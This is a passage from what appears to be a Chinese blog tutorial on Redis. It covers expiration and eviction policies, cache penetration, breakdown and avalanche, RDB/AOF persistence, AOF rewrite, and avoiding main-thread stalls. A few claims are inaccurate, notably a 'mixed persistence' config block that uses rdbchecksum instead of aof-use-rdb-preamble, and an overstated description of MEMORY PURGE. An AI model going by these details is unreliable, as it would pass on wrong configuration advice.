class="headerlink" title="删除策略详解"></a>删除策略详解</h3><ol><li><strong>惰性删除（Lazy）</strong><ul><li>客户端访问 key 时，Redis 发现已过期，就立刻删掉（并返回 nil）</li></ul></li><li><strong>定期删除（主动扫描）</strong><ul><li>每 100ms，Redis 会<strong>随机抽样一批带过期时间的 key</strong>，删除过期的</li><li>如果发现超 25% 的 key 都过期了，就<strong>加快扫描节奏</strong></li></ul></li></ol><h3 id="为什么不逐个精准定时删除？"><a href="#为什么不逐个精准定时删除？" class="headerlink" title="为什么不逐个精准定时删除？"></a>为什么不逐个精准定时删除？</h3><p>会造成高 CPU 负载，扫描量大，Redis 单线程承受不住</p><hr><h2 id="二、内存淘汰机制（Memory-Eviction）"><a href="#二、内存淘汰机制（Memory-Eviction）" class="headerlink" title="二、内存淘汰机制（Memory Eviction）"></a>二、内存淘汰机制（Memory Eviction）</h2><p>当 Redis 达到设置的最大内存（<code>maxmemory</code>），又需要写入新 key 时，会触发<strong>淘汰机制</strong>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置示例</span></span><br><span class="line">maxmemory 512mb</span><br><span class="line">maxmemory-policy allkeys-lru</span><br></pre></td></tr></table></figure><hr><h3 id="常见的内存淘汰策略"><a href="#常见的内存淘汰策略" class="headerlink" title="常见的内存淘汰策略"></a>常见的内存淘汰策略</h3><table><thead><tr><th>策略名</th><th>含义</th><th>推荐使用场景</th></tr></thead><tbody><tr><td>noeviction</td><td>默认值，不淘汰，写入时报错</td><td>不建议线上使用</td></tr><tr><td>volatile-lru</td><td>从<strong>有过期时间的 key 中</strong>淘汰最少使用的</td><td>有效控制热数据内存</td></tr><tr><td>allkeys-lru</td><td>所有 key 中淘汰最少使用的</td><td>推荐：缓存场景</td></tr><tr><td>volatile-ttl</td><td>从有过期时间的 key 中淘汰<strong>快过期的</strong></td><td>延迟淘汰控制</td></tr><tr><td>allkeys-random</td><td>所有 key 中随机淘汰</td><td>一般用作测试</td></tr><tr><td>volatile-random</td><td>有过期时间的 key 中随机淘汰</td><td>比较少用</td></tr></tbody></table><hr><h3 id="Redis-设置了-maxmemory-和淘汰策略，为什么还是-OOM-了？"><a href="#Redis-设置了-maxmemory-和淘汰策略，为什么还是-OOM-了？" class="headerlink" title="Redis 设置了 maxmemory 和淘汰策略，为什么还是 OOM 了？"></a>Redis 设置了 maxmemory 和淘汰策略，为什么还是 OOM 了？</h3><ol><li>设置的是 <code>noeviction</code>，没有开启淘汰功能</li><li>有大量 key 没设置 TTL，策略是 <code>volatile-*</code>，Redis 找不到 key 可以淘汰</li><li>有大 key（bigkey），触发淘汰时清理不及时</li><li>写入速度远超淘汰速度（高并发写入 + 单线程处理）</li></ol><hr><h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><table><thead><tr><th>建议</th><th>理由</th></tr></thead><tbody><tr><td>key 必须设置 TTL</td><td>防止缓存雪崩，内存泄露</td></tr><tr><td>建议使用 allkeys-lru</td><td>更加自动化地控制内存</td></tr><tr><td>避免存大 key（如超大 hash、list）</td><td>淘汰慢、容易卡主线程</td></tr><tr><td>监控 Redis 内存使用</td><td>用 <code>INFO MEMORY</code><br/> 或 <code>redis_exporter</code><br/> 上 Prometheus 监控</td></tr></tbody></table><hr><h2 id="自问自答"><a href="#自问自答" class="headerlink" title="自问自答"></a>自问自答</h2><ol><li>Redis 的过期 key 是怎么删除的？是实时的吗？ 不是实时的， 惰性+定期</li><li>Redis 的惰性删除和定期删除分别是什么？ </li><li>Redis 的内存淘汰策略有哪些？哪个最常用？</li><li>如果写入大量 key，但内存没满 Redis 就挂了，可能的原因有哪些？ 有设置最大内存， 或者是过多内存碎片，  或者是有写入大key，导致CPU撑不住卡主进程了…..</li><li>项目中怎么控制 Redis 占用内存？  设置<code>**maxmemory**</code><strong>、内存回收策略、过期时间控制</strong></li></ol><hr><h1 id="缓存穿透、缓存击穿、缓存雪崩"><a href="#缓存穿透、缓存击穿、缓存雪崩" class="headerlink" title="缓存穿透、缓存击穿、缓存雪崩"></a>缓存穿透、缓存击穿、缓存雪崩</h1><h2 id="缓存穿透"><a href="#缓存穿透" class="headerlink" title="缓存穿透"></a>缓存穿透</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>客户端频繁请求<strong>数据库中根本不存在的 key</strong>，由于缓存 miss，Redis 不命中，所有请求都落到底层数据库，造成数据库压力激增，甚至打挂。</p><h3 id="典型场景"><a href="#典型场景" class="headerlink" title="典型场景"></a>典型场景</h3><p>请求不存在的用户 ID，比如 <code>GET user:-1</code>，Redis miss，数据库 miss，不断重复请求。</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ol><li><strong>缓存空值</strong><ul><li>对于数据库返回 null 的数据，也缓存一个标记，例如：<code>user:-1 =&gt; &quot;null&quot;</code>，设置较短过期时间。</li></ul></li><li><strong>布隆过滤器（BloomFilter）</strong><ul><li>在 Redis 之前做一层布隆过滤器，用于快速判断 key 是否存在，避免无意义请求。</li></ul></li><li><strong>接口参数校验</strong><ul><li>提前在 API 层做参数合法性校验，比如 ID 必须 &gt; 0。</li></ul></li></ol><hr><h2 id="缓存击穿"><a href="#缓存击穿" class="headerlink" title="缓存击穿"></a>缓存击穿</h2><h3 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h3><p>一个<strong>热点 key 恰好过期</strong>，大量并发请求在这个瞬间同时打到数据库，造成数据库压力瞬时激增。</p><h3 id="典型场景-1"><a href="#典型场景-1" class="headerlink" title="典型场景"></a>典型场景</h3><p>某商品详情是热点，每秒几千请求，刚好 <code>GET product:123</code> 在某个时刻过期，所有请求瞬间穿透。</p><h3 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h3><ol><li><strong>互斥锁（分布式锁）</strong><ul><li>第一个请求获取锁去加载数据，其它请求等待或短时间返回旧数据。</li></ul></li><li><strong>永不过期 + 异步刷新</strong><ul><li>不设置过期时间，而是定时刷新缓存（通过定时任务或消息队列）。</li></ul></li><li><strong>合理设置过期时间 + 提前异步预热</strong><ul><li>对热点 key 使用更长过期时间，或者在过期前预热。</li></ul></li></ol><hr><h2 id="缓存雪崩"><a href="#缓存雪崩" class="headerlink" title="缓存雪崩"></a>缓存雪崩</h2><h3 id="问题描述-2"><a href="#问题描述-2" class="headerlink" title="问题描述"></a>问题描述</h3><p>大量 key 在同一时刻同时失效，所有请求同时穿透，数据库被压垮。</p><h3 id="典型场景-2"><a href="#典型场景-2" class="headerlink" title="典型场景"></a>典型场景</h3><p>比如你缓存设置了 1 小时统一过期，某一时刻恰好全部失效，系统瞬间崩溃。</p><h3 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h3><ol><li><strong>过期时间加随机扰动</strong><ul><li>给每个 key 设置不同的过期时间，避免同一时间集中失效。例如 <code>EX 600 + random(0~60)</code>。</li></ul></li><li><strong>热点数据永不过期 + 后台异步刷新</strong></li><li><strong>降级保护机制</strong><ul><li>当发现缓存异常，短路请求，直接返回默认值、静态页等。</li></ul></li></ol><hr><h2 id="自问自答-1"><a href="#自问自答-1" class="headerlink" title="自问自答"></a>自问自答</h2><ol><li>什么是缓存穿透？怎么解决？</li><li>缓存击穿和穿透的区别是什么？</li><li>怎么解决 Redis 大量 key 同时过期的雪崩问题？</li><li>使用 Redis 做缓存时，是否建议 key 永久有效？</li><li>有没有用过布隆过滤器？什么原理？ 是个概率性的数据结构， 用多个不同的哈希算法， 拿到的哈希值如果对应的都是1， 就是1， 只要有一个是0， 就是0， 因此存的数据量越大， 越容易误报</li></ol><h1 id="Redis的持久化机制（RDB-与-AOF）"><a href="#Redis的持久化机制（RDB-与-AOF）" class="headerlink" title="Redis的持久化机制（RDB 与 AOF）"></a>Redis的持久化机制（RDB 与 AOF）</h1><p>Redis 虽然是内存数据库，但为了防止数据丢失，提供了两种持久化机制：<strong>RDB</strong>（快照）和 <strong>AOF</strong>（追加日志）。</p><hr><h2 id="持久化方式概览"><a href="#持久化方式概览" class="headerlink" title="持久化方式概览"></a>持久化方式概览</h2><table><thead><tr><th>类型</th><th>全称</th><th>特点</th><th>数据安全性</th><th>文件大小</th><th>启动速度</th></tr></thead><tbody><tr><td>RDB</td><td>Redis DataBase snapshot</td><td>定期快照</td><td>较低</td><td>小</td><td>快</td></tr><tr><td>AOF</td><td>Append Only File</td><td>日志追加</td><td>高</td><td>大</td><td>慢（需重放）</td></tr><tr><td>混合模式</td><td>RDB + AOF</td><td>Redis 4.0 后默认</td><td>综合优点</td><td>可控</td><td>快速恢复</td></tr></tbody></table><hr><h2 id="RDB（快照方式）"><a href="#RDB（快照方式）" class="headerlink" title="RDB（快照方式）"></a>RDB（快照方式）</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul><li>Redis 在一定时间间隔内将内存数据写入一个压缩过的二进制文件（<code>.rdb</code>）</li><li>触发方式：<ul><li>自动：配置 <code>save 900 1</code>（900 秒内至少 1 个 key 变动）</li><li>手动：执行 <code>SAVE</code> 或 <code>BGSAVE</code> 命令</li></ul></li></ul><h3 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h3><ul><li>启动恢复速度快</li><li>文件体积小，适合备份、灾备迁移</li></ul><h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><ul><li>可能丢失最近一次修改（最后一次快照之后的数据）</li><li>BGSAVE 会 fork 子进程，写入大文件时会造成系统负载升高</li></ul><hr><h2 id="AOF（日志方式）"><a href="#AOF（日志方式）" class="headerlink" title="AOF（日志方式）"></a>AOF（日志方式）</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><ul><li>所有写命令会追加到 <code>.aof</code> 文件中，Redis 重启时按顺序“重放命令”恢复数据</li><li>三种刷盘策略（由 <code>appendfsync</code> 决定）：<ul><li>always：每次写都刷盘（最安全，最慢）</li><li>everysec：每秒刷一次（默认）</li><li>no：由操作系统决定（可能丢失几秒）</li></ul></li></ul><h3 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h3><ul><li>数据恢复更完整（最多丢失 1 秒）</li><li>适合对数据完整性要求高的场景</li></ul><h3 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h3><ul><li>文件越来越大，需要定期重写（BGREWRITEAOF）</li><li>启动时需要重放日志，恢复速度比 RDB 慢</li></ul><hr><h2 id="混合持久化（Redis-4-0-）"><a href="#混合持久化（Redis-4-0-）" class="headerlink" title="混合持久化（Redis 4.0+）"></a>混合持久化（Redis 4.0+）</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><ul><li>在 AOF 重写时，先将当前快照（RDB 格式）写入 AOF，然后再追加后续写命令</li><li>好处：<ul><li>启动速度几乎和 RDB 一样快</li><li>数据完整性和 AOF 一样高</li></ul></li></ul><h3 id="开启方式"><a href="#开启方式" class="headerlink" title="开启方式"></a>开启方式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aof-use-rdb-preamble <span class="built_in">yes</span></span><br></pre></td></tr></table></figure><hr><h2 id="配置示例"><a href="#配置示例" class="headerlink" title="配置示例"></a>配置示例</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">save 900 1</span><br><span class="line">appendonly <span class="built_in">yes</span></span><br><span class="line">appendfsync everysec</span><br><span class="line"><span class="built_in">dir</span> /var/lib/redis</span><br></pre></td></tr></table></figure><hr><h2 id="自问自答-2"><a href="#自问自答-2" class="headerlink" title="自问自答"></a>自问自答</h2><ol><li>Redis 持久化有几种方式？分别适用于什么场景？</li><li>如果 Redis 宕机了，数据怎么恢复？会不会丢数据？</li><li>RDB 和 AOF 哪个恢复速度更快？哪个更安全？</li><li>怎么避免 RDB&#x2F;AOF 持久化造成主线程卡顿？</li></ol><hr><h2 id="实战建议-1"><a href="#实战建议-1" class="headerlink" title="实战建议"></a>实战建议</h2><table><thead><tr><th>建议</th><th>理由</th></tr></thead><tbody><tr><td>开启 AOF + everysec 模式</td><td>实现安全性和性能的平衡</td></tr><tr><td>配置 save 900 1 等参数</td><td>保留定期快照，便于快速恢复</td></tr><tr><td>设置 aof-use-rdb-preamble yes</td><td>兼顾快速启动与完整性</td></tr><tr><td>使用 Redis 主从 + 持久化</td><td>容灾架构更稳妥</td></tr></tbody></table><h1 id="Redis-是怎么做-AOF-重写的？会不会影响性能？"><a href="#Redis-是怎么做-AOF-重写的？会不会影响性能？" class="headerlink" title="Redis 是怎么做 AOF 重写的？会不会影响性能？"></a>Redis 是怎么做 AOF 重写的？会不会影响性能？</h1><p>在 Redis 中，<strong>AOF（Append Only File）重写</strong> 是一种用于优化磁盘 I&#x2F;O 和 AOF 文件大小的机制。AOF 重写是 Redis 在持久化数据时采取的一种方式，目的是定期生成新的 AOF 文件，从而减少旧文件的大小并提高性能。</p><h3 id="什么是-AOF-重写？"><a href="#什么是-AOF-重写？" class="headerlink" title="什么是 AOF 重写？"></a><strong>什么是 AOF 重写？</strong></h3><p>Redis 使用 AOF 持久化机制时，会将所有的写命令记录到 AOF 文件中，这样即使 Redis 重启，数据也不会丢失。随着时间的推移，AOF 文件可能会变得非常大，尤其是在有大量写操作的场景下。为了避免 AOF 文件过大，Redis 提供了 <strong>AOF 重写（AOF rewrite）</strong> 机制。</p><p>AOF 重写是指 Redis 会创建一个新的 AOF 文件，只记录 <strong>当前数据库状态</strong> 的最简写操作，从而生成一个更小的文件。这个过程不会影响 Redis 正常的写操作，但会在后台进行，保证 Redis 在重写期间继续为客户端提供服务。</p><h3 id="AOF-重写的工作原理"><a href="#AOF-重写的工作原理" class="headerlink" title="AOF 重写的工作原理"></a><strong>AOF 重写的工作原理</strong></h3><ol><li><strong>触发条件</strong>：<ul><li>AOF 重写通常由 Redis 根据 AOF 文件的大小和重写条件来触发。重写会在 Redis 认为 AOF 文件过大时自动进行，或者也可以通过手动调用 <code>BGREWRITEAOF</code> 命令来触发。</li></ul></li><li><strong>重写过程</strong>：<ul><li>在 AOF 重写过程中，Redis 会创建一个新的 AOF 文件，并在后台 <strong>重新生成</strong> AOF 文件中的命令。这个过程会记录所有当前数据库状态所需的最小写命令。</li><li>比如，如果数据库中某个键的值已经改变了多次，Redis 会将该键的最终状态写入新的 AOF 文件，而不再记录每次对该键的修改操作。</li></ul></li><li><strong>AOF 重写的工作步骤</strong>：<ul><li><strong>步骤 1</strong>：Redis 在后台创建一个新的 AOF 文件，并逐个遍历数据库中的所有键，生成一组命令来重新构建当前数据库的状态。</li><li><strong>步骤 2</strong>：当新的 AOF 文件创建完成后，Redis 会将当前 AOF 文件中的所有命令写入新文件中，确保新文件包含了数据库的最新状态。</li><li><strong>步骤 3</strong>：一旦新的 AOF 文件完成，Redis 会关闭原来的 AOF 文件，将新的文件替换为当前 AOF 文件。</li></ul></li><li><strong>后台执行</strong>：<ul><li>在进行 AOF 重写时，Redis 会使用 <strong>后台（fork）</strong> 的方式创建一个子进程来执行重写操作。这个子进程会处理数据的写入，不会影响主进程的运行。</li><li>这种方式允许 Redis 在 AOF 重写期间继续服务客户端请求，保证了系统的高可用性。</li></ul></li></ol><h3 id="AOF-重写是否会影响性能？"><a href="#AOF-重写是否会影响性能？" class="headerlink" title="AOF 重写是否会影响性能？"></a><strong>AOF 重写是否会影响性能？</strong></h3><p>AOF 重写的过程是通过 <strong>fork 子进程</strong> 来执行的，因此在执行重写时，Redis 主进程可以继续服务客户端请求。但是，AOF 重写操作还是会对性能产生一定的影响，具体体现在以下几个方面：</p><ol><li><strong>内存占用</strong>：<ul><li>在 AOF 重写期间，Redis 会在后台创建一个子进程，并复制主进程的内存空间。这意味着在重写过程中，Redis 的内存使用量会增加，因为它需要同时保持原有的 AOF 文件和新的 AOF 文件内容。对于内存较小的机器，这可能会导致内存使用高峰。</li></ul></li><li><strong>CPU 占用</strong>：<ul><li>AOF 重写需要扫描整个数据库，并生成新的 AOF 文件，这会消耗一定的 CPU 资源。虽然 Redis 会在后台执行这一过程，但在大数据量的情况下，CPU 的负载可能会暂时增高。</li></ul></li><li><strong>磁盘 I&#x2F;O</strong>：<ul><li>AOF 重写会生成新的 AOF 文件，并将新的命令写入磁盘。这会增加磁盘的写入压力。如果磁盘性能较差或 I&#x2F;O 较高的场景下，可能会对性能产生影响。</li></ul></li><li><strong>阻塞时间</strong>：<ul><li>在某些情况下，尤其是当 AOF 文件非常大，或者当系统资源有限时，AOF 重写可能会导致 Redis 的响应时间略微增加，特别是在频繁触发 AOF 重写时。</li></ul></li><li><strong>fork 子进程的影响</strong>：<ul><li>Redis 使用 <code>fork</code> 创建子进程来执行 AOF 重写操作，而 <code>fork</code> 操作会占用一定的系统资源。虽然子进程会在重写完成后被销毁，但在 <code>fork</code> 的过程中，操作系统需要进行内存页的复制，这会消耗 CPU 和内存资源。</li></ul></li></ol><h3 id="如何减少-AOF-重写对性能的影响？"><a href="#如何减少-AOF-重写对性能的影响？" class="headerlink" title="如何减少 AOF 重写对性能的影响？"></a><strong>如何减少 AOF 重写对性能的影响？</strong></h3><p>为了减少 AOF 重写对性能的影响，可以采取以下策略：</p><ol><li>**合理设置 <strong><code>**auto-aof-rewrite-percentage**</code></strong> 和 **<code>**auto-aof-rewrite-min-size**</code>：<ul><li><code>auto-aof-rewrite-percentage</code>：控制触发 AOF 重写的条件。它设置为相对于上次重写时 AOF 文件的大小增长百分比。</li><li><code>auto-aof-rewrite-min-size</code>：控制 AOF 文件的最小大小，只有当文件大小超过这个值时，才会考虑执行 AOF 重写。</li></ul></li></ol><p>通过合理配置这两个参数，可以控制 AOF 重写的触发频率，从而避免频繁的 AOF 重写操作，减小对性能的影响。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto-aof-rewrite-percentage 100  <span class="comment"># AOF 文件大小增加 100% 后进行重写</span></span><br><span class="line">auto-aof-rewrite-min-size 64mb  <span class="comment"># AOF 文件超过 64MB 时才进行重写</span></span><br></pre></td></tr></table></figure><ol start="2"><li><strong>使用合适的硬件资源</strong>：<ul><li>如果可能，考虑为 Redis 配置更高性能的硬件，尤其是 I&#x2F;O 密集型的存储设备（如 SSD）。更强大的硬件可以显著减少 AOF 重写过程中对磁盘 I&#x2F;O 的压力。</li></ul></li><li><strong>优化 <strong><code>**maxmemory-policy**</code></strong> 配置</strong>：<ul><li>在 Redis 中设置合理的内存回收策略，确保内存不会过度占用，避免因内存不足导致频繁的 AOF 重写。</li></ul></li><li><strong>分批写入数据</strong>：<ul><li>对于大量写入数据的场景，考虑将数据写入 Redis 时分批处理，减少瞬时写入压力，降低 AOF 文件增长速度。</li></ul></li><li><strong>使用 AOF + RDB 混合持久化（RDB + AOF）</strong>：<ul><li>Redis 还支持同时使用 <strong>RDB（快照）</strong> 和 <strong>AOF</strong> 两种持久化方式，您可以通过配置 Redis 在一定间隔内执行快照（RDB）保存，并在更高频次下执行 AOF 持久化。这可以减小对性能的影响，同时保证数据持久化。</li></ul></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启用 RDB 和 AOF 混合持久化</span></span><br><span class="line">appendonly <span class="built_in">yes</span></span><br><span class="line">appendfsync everysec</span><br><span class="line">save 900 1</span><br><span class="line">save 300 10</span><br><span class="line">save 60 10000</span><br></pre></td></tr></table></figure><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>AOF 重写是 Redis 为了优化 AOF 文件大小、提高性能和减少磁盘 I&#x2F;O 而采取的机制。虽然 AOF 重写通常是在后台进行，不会阻塞主进程，但它确实会消耗一些额外的 CPU 和内存资源，尤其是在大数据量的情况下。因此，合理的配置和硬件资源的支持是确保 AOF 重写不会对性能产生过大影响的关键。</p><hr><h1 id="怎么避免-RDB-AOF-持久化造成主线程卡顿"><a href="#怎么避免-RDB-AOF-持久化造成主线程卡顿" class="headerlink" title="怎么避免 RDB&#x2F;AOF 持久化造成主线程卡顿"></a>怎么避免 RDB&#x2F;AOF 持久化造成主线程卡顿</h1><p>在 Redis 中，RDB 和 AOF 是两种常见的持久化机制，它们会定期将内存中的数据持久化到磁盘，确保数据的持久性。但这两个过程可能会造成一定的 <strong>主线程卡顿</strong>，特别是在大规模数据存储或高并发环境下，RDB 和 AOF 持久化过程会占用大量的 CPU 和 I&#x2F;O 资源，从而影响 Redis 的响应速度和性能。</p><p>下面是一些避免 RDB&#x2F;AOF 持久化造成主线程卡顿的方法</p><h2 id="1-使用-RDB-快照时采用后台保存（save-和-BGSAVE）"><a href="#1-使用-RDB-快照时采用后台保存（save-和-BGSAVE）" class="headerlink" title="1. 使用 RDB 快照时采用后台保存（save 和 BGSAVE）"></a>1. 使用 RDB 快照时采用后台保存（<code>save</code> 和 <code>BGSAVE</code>）</h2><ul><li>默认情况下，Redis 使用 <code>**BGSAVE**</code>（背景保存）来执行 RDB 快照操作。<code>BGSAVE</code> 会在后台创建一个子进程，主线程继续服务客户端请求。</li><li><code>BGSAVE</code> 操作不会阻塞主线程，它通过 <code>fork()</code> 子进程的方式执行，因此可以在不影响 Redis 主线程的情况下进行持久化。</li><li><strong>注意</strong>：如果在 Redis 配置中使用 <code>**save**</code> 命令来设置 RDB 快照（比如每隔 900 秒进行一次快照），如果在执行 RDB 时不使用 <code>BGSAVE</code>，则会导致 <strong>阻塞</strong>，因为此时 Redis 主线程会被锁定，直到 RDB 快照完成。</li></ul><p><strong>配置</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># RDB 快照配置示例</span></span><br><span class="line">save 900 1</span><br><span class="line">save 300 10</span><br><span class="line">save 60 10000</span><br></pre></td></tr></table></figure><p>在 <code>BGSAVE</code> 执行期间，主线程仍然可以继续处理客户端请求。</p><h2 id="2-合理配置-AOF-持久化"><a href="#2-合理配置-AOF-持久化" class="headerlink" title="2. 合理配置 AOF 持久化"></a>2. 合理配置 AOF 持久化</h2><p>AOF（Append Only File）将 Redis 执行的所有写操作追加到 AOF 文件中，以保证持久化数据。AOF 的同步策略（<code>appendfsync</code>）决定了每次写入操作是如何同步到磁盘的：</p><ul><li><code>**appendfsync always**</code>：每次写操作都会同步到磁盘，性能最低，通常不推荐。</li><li><code>**appendfsync everysec**</code>：每秒同步一次。是推荐的设置，性能和数据持久性之间有一个良好的平衡。</li><li><code>**appendfsync no**</code>：让操作系统决定何时将数据同步到磁盘，性能最高，但在系统崩溃时可能会丢失一些数据。</li></ul><p><strong>推荐设置</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">appendonly <span class="built_in">yes</span></span><br><span class="line">appendfsync everysec  <span class="comment"># 每秒钟一次同步到磁盘</span></span><br></pre></td></tr></table></figure><p><code>appendfsync everysec</code> 可以最大限度减少 AOF 持久化对主线程的影响，同时确保数据的持久性。</p><h2 id="3-启用-AOF-重写机制"><a href="#3-启用-AOF-重写机制" class="headerlink" title="3. 启用 AOF 重写机制"></a>3. 启用 AOF 重写机制</h2><p>AOF 文件随着时间的推移会变得越来越大，这样会导致持久化操作变得非常慢，影响 Redis 的性能。为了防止 AOF 文件过大导致性能下降，Redis 提供了 <strong>AOF 重写（AOF rewrite）</strong> 机制。</p><p><strong>AOF 重写</strong> 的过程是将当前数据库的状态重新写入 AOF 文件，并且会创建一个新的 AOF 文件，而不记录所有历史操作。AOF 重写是通过一个后台进程来完成的，因此它不会影响主线程。</p><p><strong>AOF 重写的触发条件</strong>：</p><ul><li>当 AOF 文件的大小超出一定比例时（默认是 100%）。</li><li>可以通过配置 <code>auto-aof-rewrite-percentage</code> 和 <code>auto-aof-rewrite-min-size</code> 来控制触发条件。</li></ul><p><strong>配置示例</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自动触发 AOF 重写的条件</span></span><br><span class="line">auto-aof-rewrite-percentage 100  <span class="comment"># 当 AOF 文件大小增加 100% 时触发重写</span></span><br><span class="line">auto-aof-rewrite-min-size 64mb  <span class="comment"># 当 AOF 文件超过 64MB 时触发重写</span></span><br></pre></td></tr></table></figure><p>通过合理配置 AOF 重写，Redis 可以自动优化 AOF 文件的大小，避免在文件过大的时候影响性能。</p><h2 id="4-优化磁盘-I-O-性能"><a href="#4-优化磁盘-I-O-性能" class="headerlink" title="4. 优化磁盘 I&#x2F;O 性能"></a>4. 优化磁盘 I&#x2F;O 性能</h2><p>RDB 和 AOF 持久化操作都涉及到磁盘 I&#x2F;O，因此磁盘性能对于持久化的效率至关重要。使用更快的存储设备（例如 SSD）可以显著提高持久化过程的性能，减少对主线程的影响。</p><p><strong>优化建议</strong>：</p><ul><li>使用 <strong>SSD</strong>（固态硬盘）而不是传统的 <strong>HDD</strong>（机械硬盘），以减少磁盘 I&#x2F;O 的延迟。</li><li>将 Redis 的数据目录和 AOF 文件存储在不同的物理磁盘上，避免磁盘 I&#x2F;O 竞争。</li><li>通过 <code>**vm.dirty_background_bytes**</code> 等内核参数来调整操作系统的 I&#x2F;O 调度策略，优化磁盘写入效率。</li></ul><h2 id="5-定期执行-MEMORY-PURGE-清理内存碎片"><a href="#5-定期执行-MEMORY-PURGE-清理内存碎片" class="headerlink" title="5. 定期执行 MEMORY PURGE 清理内存碎片"></a>5. 定期执行 <code>MEMORY PURGE</code> 清理内存碎片</h2><p>当 Redis 进行大量写入和持久化时，内存碎片可能导致内存管理效率低下，从而影响 Redis 性能。使用 <code>**MEMORY PURGE**</code> 命令可以清理 Redis 中的内存碎片，释放无用内存，从而减少内存使用和提高性能。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MEMORY PURGE  <span class="comment"># 清理内存碎片</span></span><br></pre></td></tr></table></figure><p>定期执行内存清理操作有助于减轻持久化时的内存负担，从而改善 Redis 性能。</p><h2 id="6-使用混合持久化（RDB-AOF）"><a href="#6-使用混合持久化（RDB-AOF）" class="headerlink" title="6. 使用混合持久化（RDB + AOF）"></a>6. 使用混合持久化（RDB + AOF）</h2><p>Redis 支持混合持久化，即同时使用 <strong>RDB 和 AOF</strong>。通过这种方式，Redis 可以在启动时使用 RDB 快照来恢复数据，而在写操作时使用 AOF 进行持久化。混合持久化通过减少 AOF 文件的大小来优化性能，并提高 Redis 的启动速度。</p><p><strong>启用混合持久化</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">appendonly <span class="built_in">yes</span></span><br><span class="line">appendfsync everysec</span><br><span class="line">rdbchecksum <span class="built_in">yes</span></span><br></pre></td></tr></table></figure><p>混合持久化的优势是，在不牺牲持久化的可靠性和完整性的情况下，通过 AOF 重写和 RDB 快照的结合来减少磁盘 I&#x2F;O 的压力。</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>为了避免 RDB 和 AOF 持久化造成 Redis 主线程卡顿，可以采取以下措施：</p><ol><li>**使用 **<code>**BGSAVE**</code> 执行 RDB 快照，避免阻塞主线程。</li><li><strong>合理配置 AOF 持久化策略</strong>（推荐 <code>appendfsync everysec</code>）来平衡性能和持久性。</li><li><strong>利用 AOF 重写</strong> 来减少 AOF 文件的大小，避免性能下降。</li><li><strong>优化磁盘 I&#x2F;O 性能</strong>，使用 SSD 或更快的存储设备来提高持久化效率。</li><li><strong>定期清理内存碎片</strong>，通过 <code>MEMORY PURGE</code> 来减轻内存管理负担。</li><li><strong>使用混合持久化</strong>（RDB + AOF）来提升性能，减少 AOF 文件大小。</li></ol><p>通过这些方法，您可以减少 RDB 和 AOF 持久化对 Redis 性能的影响，提高系统的响应速度和可用性。</p><h1 id="Redis是怎么存储有序集合zset的"><a href="#Redis是怎么存储有序集合zset的" class="headerlink" title="Redis是怎么存储有序集合zset的"></a>Redis是怎么存储有序集合zset的</h1><p><strong>Redis 的 ZSet（有序集合）</strong>，它在 Redis 中扮演着非常核心的角色，特别适用于排行榜、延时队列、权重调度等场景。</p><hr><h2 id="什么是-ZSet（Sorted-Set）"><a href="#什么是-ZSet（Sorted-Set）" class="headerlink" title="什么是 ZSet（Sorted Set）"></a>什么是 ZSet（Sorted Set）</h2><p>ZSet 是 Redis 中的一种数据结构，全称是 <strong>有序集合（Sorted Set）</strong>。</p><p>它的特点是：</p><ul><li>每个元素都是唯一的（像 Set）</li><li>每个元素关联一个 <strong>score</strong>（分数），按 score 排序（像优先队列）</li><li>可以按分数范围、高低排名、高低分数做高效查询</li></ul><p>你可以把 ZSet 看成是：<br><strong>带权重的 Set + 排序链表 + 快速查找结构</strong></p><hr><h2 id="数据结构实现：跳表-哈希表"><a href="#数据结构实现：跳表-哈希表" class="headerlink" title="数据结构实现：跳表 + 哈希表"></a>数据结构实现：跳表 + 哈希表</h2><h3 id="ZSet-底层用了两个结构："><a 